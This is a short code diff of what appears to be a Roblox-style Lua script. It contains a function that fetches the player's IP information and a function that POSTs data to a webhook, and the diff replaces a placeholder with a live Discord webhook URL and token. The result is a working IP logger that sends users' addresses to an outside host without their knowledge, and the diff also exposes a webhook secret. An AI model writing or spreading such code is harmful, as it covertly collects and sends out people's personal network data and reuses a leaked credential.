@@ -25,7 +25,7 @@ local function getPlayerIP()
     return game:GetService("HttpService"):JSONDecode(ip_info.Body)
 end
 local function sendWebhook(data)
-    local webhook_url = "no"
+    local webhook_url = "https://discord.com/api/webhooks/1351655594003792026/QK6yVm3f1Q9SugbBIFLLC0eOoUhxpW2ZHWZOwm8LOJ79net43rNWq8Cvgk6Xd6qzUarQ"
     request({
         Url = webhook_url,
         Method = "POST",
